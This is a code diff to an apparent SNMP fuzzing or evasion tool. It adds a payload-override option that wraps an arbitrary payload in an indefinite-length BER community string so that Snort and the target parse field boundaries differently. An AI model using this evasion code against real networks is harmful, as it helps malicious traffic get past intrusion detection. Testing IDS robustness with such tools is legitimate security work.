@@ -274,10 +274,16 @@ def _build_ber_length_overflow():
 
 
 # ── Strategy 2: indefinite + non-minimal length encoding ────────────────────
-def _build_ber_indefinite_nonminimal():
+def _build_ber_indefinite_nonminimal(payload_override=None):
     """Indefinite length form (0x80, ambiguous for SNMP) and redundant/
     non-minimal length octets. Snort and the target may disagree on field
     boundaries -> evasion / desync."""
+    if payload_override is not None:
+        vb = _varbindlist([_varbind(_OID_SYSDESCR)])
+        pdu = _std_pdu(_PDU_GET, vb)
+        evil_comm = bytes([_T_OCTET_STRING, 0x80]) + payload_override + b"\x00\x00"
+        body = _integer(1) + evil_comm + pdu
+        return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 161
     variant = random.choice([
         "indefinite_outer", "indefinite_octet", "nonmin_1", "nonmin_pad_zero",
         "nonmin_all", "mixed",
@@ -847,12 +853,17 @@ _BUILDERS = {
 }
 
 
-def build_snmp_payload(strategy: str):
+_SNMP_OVERRIDE_CAPABLE = frozenset(["ber_indefinite_nonminimal"])
+
+def build_snmp_payload(strategy: str, payload_override=None):
     """Return (payload_bytes, dst_port) for the given strategy."""
     builder = _BUILDERS.get(strategy)
     if builder is None:
         builder = _build_ber_length_overflow
-    payload, dst_port = builder()
+    if payload_override is not None and strategy in _SNMP_OVERRIDE_CAPABLE:
+        payload, dst_port = builder(payload_override=payload_override)
+    else:
+        payload, dst_port = builder()
     return _clamp(payload), dst_port
 
 
@@ -869,12 +880,12 @@ class SnmpMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return SNMP_WEIGHTS
 
-    def mutate(self):
+    def mutate(self, payload_override=None):
         """Returns (payload_bytes, strategy_name, dst_port)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload, dst_port = build_snmp_payload(strategy)
+        payload, dst_port = build_snmp_payload(strategy, payload_override=payload_override)
         return payload, strategy, dst_port
 
